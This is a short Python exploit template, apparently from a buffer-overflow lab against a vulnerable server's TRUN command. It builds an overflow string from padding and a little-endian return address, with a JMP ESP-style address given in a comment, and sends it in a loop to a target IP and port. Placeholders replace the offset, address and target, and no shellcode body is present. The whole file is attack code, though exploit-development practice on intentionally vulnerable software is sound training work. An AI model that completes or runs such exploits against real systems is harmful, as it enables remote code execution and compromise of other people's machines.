#!/usr/bin/python
import sys, socket

# example for address 0x625011af == "\xaf\x11\x50\x62"
shellcode = "A" * < offset_value > + < little_endian_format >

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((< target_ip >, < port >))
        s.send(('TRUN /.:/' + shellcode))
        s.close()
    except:
        print
        "Error connecting to server"
        sys.exit()

